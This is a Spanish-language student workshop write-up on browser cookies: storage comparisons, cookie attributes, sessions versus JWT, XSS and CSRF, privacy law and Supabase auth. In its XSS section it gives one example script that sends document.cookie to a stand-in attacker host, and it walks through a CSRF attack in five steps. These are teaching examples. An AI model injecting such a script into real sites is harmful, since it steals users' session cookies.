# TALLER COOKIES 

## ¿ QUE ES UNA COOKIE Y EN QUE SE DIFERENCIA DE LOCALSTORAGE Y SESSIONSTORAGE ?

### Una cookie es un fragmento de datos que el servidor envia al navegador del usuario , con el fin de verificar una sesion o como seguridad .

| Pregunta | Cookie | localStorage | sessionStorage |
|---|---|---|---|
| ¿Se envía automáticamente al servidor? | Sí | No | No |
| ¿Sobrevive a cerrar el navegador? | Sí, si tiene fecha de expiración futura. Si es cookie de sesión, no | Si | No |
| ¿Tiene expiración configurable? | Sí | No, no expira sola. Hay que borrarla con código | No, su vida es la duración de la pestaña |
| ¿Tamaño máximo aproximado? | ~4KB por cookie | ~5 a 10MB por origen | ~5 a 10MB por origen |
| ¿Accesible desde JavaScript? | Sí | Sí | Sí |

## ¿Por qué el HTTP es "sin estado" (stateless) y qué problema resuelven las cookies frente a eso?

Esta sin estado por que los servidores no requieren alamacenar informacion de millones de usuarios al mismo tiempo , no lo hacen por que si no el consumo de accion del cpu seria inmenso y ademas por proteccion . la cookie resuelve este problema ya que ese fragmento de dato es como un identificador que le permite al navegador reconocerte .

## 2. Como se crea una cookie 

## Qué encabezado HTTP usa el servidor para pedirle al navegador que guarde una cookie, y qué encabezado usa el navegador para reenviarla.

hay dos tipos de encabezados por los cuales el servidor y el navegador se comunican : 
- De servidor a navegador = set-cookie :
 `HTTP/1.1 200 OK`
Set-Cookie: usuario=juan; Secure; HttpOnly; SameSite=Lax
- De navegador a servidor :
` GET /perfil HTTP/1.1 `
Host: ejemplo.com
Cookie: usuario=juan; tema=oscuro

## Cómo se crea una cookie desde JavaScript en el navegador (document.cookie) y por qué esa API es incómoda de usar directamente.

Se crea asignandole un texto a document.cookie , ejemplo : 

` document.cookie = "usuario=juan `

es incomoda por que su proceso y que no se señala a las demas cookies existentes , aparte de que no se puede consultar una fecha de expiracion anterior de una cookie , su lectura compleja y su antiguedad.

## Diferencia entre una cookie creada por el servidor y una creada por JavaScript del lado del cliente.

su estrtuctura  de inicio es distinta  ya que una creada por el servidor es : Set -cookie y una por el js es ; document.cookie , el del servidor da respuesta al http del servidor mediante el encabezado de Set - cookie  ypor otro lado el del js es un codigo ejecutado en el navegador del cliente .

## 3. Atributos de una cookie 

## Expires y Max-Age. ¿Qué es una cookie de sesión (sin ninguno de los dos)?

Expires defiene una fecha y hora , que estara la cookie activa . Max - Age defiene el tiempo de vida de la misma en segundos , jemplo Max -  Age =3600 para una hora . si estos dos se omiten la cookie se convierte en una cookie de sesion , una cookie que expira cuando se cierre la ventana .

## Domain y Path. ¿Qué diferencia hay entre no poner Domain y ponerlo explícitamente?

-Domain : define los dominios y subdominios de la cookie . 
- path : restringe el envio de la cookie a rutas especificas dentro del dominio de la misma . 

Si no se coloca el domain la cookie se registre a al host exacto sin incluir los subdominios. y si se coloca el domain si se incluye los subdominios .

## Secure. ¿Qué pasa si intentas usarla en un sitio servido por http://?

como secure esta explicita para que la comunicacion se realize dentro de un HTTPS , los navegadores actuales la rechazarian e  ignorarian ( exceptuando casos de https:localhost).

## HttpOnly. ¿Por qué esto es clave para mitigar ataques XSS? ¿Puede leerla document.cookie? 

Impide que el codigo de java ejecutado en el cliente pueda acceder a la cookie mediamte document.cookie o la API de cookiestore .
cuando sufre un ataque XSS el atacante puede leer informacion , al protegerla con httpOnly , el atacante no puede leer o acceder a los datos . 

## SameSite (Strict, Lax, None). Explica con un ejemplo concreto de cada valor: ¿la cookie viaja si el usuario llega desde un enlace externo? ¿Y si un <iframe> de otro sitio te embebe? ¿Qué requisito extra exige el navegador cuando SameSite=None?

Conexion entre sitios , SameSite = strict : 

- Ejemplo enlace externo: Estás en twitter.com y haces clic en un enlace hacia mibanco.com. La cookie no se envía en la carga inicial; se enviará solo cuando ya navegues dentro de mibanco.com.

- Ejemplo <iframe>: Si otrositio.com embebe un <iframe> apuntando a mibanco.com, la cookie tampoco se envía.
 
 Samesite= lax : la cookie se retiene en peticiones de otro sitio , salvo en navegadores de mayor nivel 

 - Ejemplo enlace externo: Haces clic en un enlace en twitter.com que te lleva a mibanco.com (navegación GET de nivel superior). Sí envía la cookie, permitiendo que entres directamente autenticado.
 
 - Ejemplo <iframe>: Si otrositio.com embebe mibanco.com en un <iframe>, la cookie no se envía (no es navegación de nivel superior).

SameSite = none la cookie se envia en todas las petciones tanto navegaciones de nivel superior como terceros . 
- Requisito extra obligatorio: Exige que la cookie lleve siempre el atributo Secure (SameSite=None; Secure). Si intentas usar SameSite=None sin Secure, el navegador la rechazará.

## Partitioned (CHIPS). ¿Qué problema nuevo intenta resolver?


 el partitioned intenta resolver la privacidad de nosotros, esto  por las cookies a travez de terceros que pueden ser rastreadas .

## 4. first-party vs third-party

first-party: es la cookie que pone la misma pagina donde estas. estas en youtube.com y la cookie es de youtube.com

third-party: es la que pone otro dominio. estas en eltiempo.com y te pone cookie de doubleclick.net

por que las bloquean safari, firefox y chrome:
porque con las de terceros te siguen por todos lados y te arman un perfil para publicidad.

ejemplo legitimo de terceros:
un video de vimeo o un chat de intercom que pones en tu pagina, necesita su cookie para funcionar.

ejemplo de rastreo:
ves unos tenis en falabella y despues te salen en todas las paginas, eso es una third-party de google o facebook.

## 5. sesiones y autenticacion

sesion del lado del servidor:
el servidor guarda todo, tipo userId, rol, etc. al navegador solo le manda un id como session=abc123. la cookie no tiene datos, solo la llave.

sesion con cookie vs jwt:
con cookie el estado esta en el servidor, es mas seguro porque lo puedes revocar rapido pero no escala tanto.
con jwt el estado esta en el mismo token, el servidor solo verifica la firma, escala mejor pero no lo puedes revocar hasta que expire.

donde se guarda el jwt:
en localStorage, en cookie o en memoria.

riesgo localStorage:
si te meten un xss pueden hacer localStorage.getItem('jwt') y te lo roban facil.

riesgo cookie HttpOnly:
no te la roban con xss porque js no la ve, pero si te pueden hacer csrf porque el navegador la manda automatico.

por que localStorage no tiene csrf:
porque no se manda solo, tu tienes que ponerlo manual en el header Authorization.

refresh token:
es el token que dura mucho, 7 dias o mas. sirve para pedir otro access token sin tener que loguearte. se guarda mas protegido con HttpOnly, Secure y SameSite Strict porque si te lo roban entran siempre.

## 6. xss y csrf

xss:
te meten un script en un comentario por ejemplo <script>fetch('malo.com?c='+document.cookie)</script> y cuando entras tu navegador lo ejecuta y manda tus cookies al atacante. con HttpOnly eso no pasa porque document.cookie no la puede leer.

csrf paso a paso:
1. estas logueado en banco.com y tienes tu cookie session=123
2. entras a sitio-malicioso.com
3. ese sitio tiene un form oculto que hace post a banco.com/transferir
4. tu navegador manda tu cookie automatico porque va a banco.com
5. el banco piensa que fuiste tu y hace la transferencia

como ayuda SameSite:
Lax no deja que se mande la cookie en post cross-site. Strict nunca la manda si vienes de otro sitio. pero no es 100% por eso se usa tambien el csrf token que es un codigo que va en el body y el atacante no lo sabe.

## 7. privacidad y normativa

rgpd y ley 1581 de colombia dicen que no puedes poner cookies con datos personales sin permiso. tienes que avisar que cookies usas y para que y dejar que el usuario rechace.

necesarias vs no necesarias:
necesarias: login, carrito, csrf_token. no necesitan permiso porque sin eso la pagina no funciona.
no necesarias: analytics, marketing, facebook pixel. si necesitan permiso.

banner de consentimiento:
es el popup de aceptar cookies. minimo debe dejar rechazar todo, aceptar por categorias y poder quitar el permiso despues.

## 8. supabase

como maneja la sesion:
en una spa pura de react sin servidor guarda en localStorage por defecto, algo como sb-proyecto-auth-token.

si es con next.js existe el paquete @supabase/ssr que si usa cookies porque tienes servidor y te da createServerClient.

por que en spa usa localStorage:
porque una cookie HttpOnly solo la puede crear un servidor con Set-Cookie. si tu pagina esta en github pages no tienes servidor entonces no puedes.

que cabecera para github pages:
cors. tienes que poner tu dominio https://tuusuario.github.io en supabase > auth > allowed origins. y supabase te responde con Access-Control-Allow-Origin: https://tuusuario.github.io

## 9. herramientas del navegador

donde se ven:
chrome: f12 > Application > Storage > Cookies
firefox: f12 > Storage > Cookies

columnas:
Name, Value, Domain, Path, Expires, Size, HttpOnly, Secure, SameSite

como borrar una sola:
click derecho sobre la cookie > Delete. no tienes que borrar todas.
